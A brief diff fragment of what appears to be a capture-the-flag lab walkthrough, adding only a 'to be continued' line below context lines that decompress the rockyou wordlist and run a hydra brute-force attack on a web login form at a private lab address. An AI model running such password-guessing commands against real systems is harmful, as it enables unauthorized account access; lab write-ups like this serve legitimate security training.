@@ -164,3 +164,4 @@ gunzip ./rockyou.txt.gz
 
 hydra -l rmichaels -P /usr/share/wordlists/rockyou.txt 172.16.1.76 http-form-post "/imfadministrator/index.php:user=^USER^&pass=^PASS^:Invalid:H=Cookie: PHPSESSID=71jtqremlb5q74hge3apaog8d3" -t 64
 ```
+ # .. To be continued ..
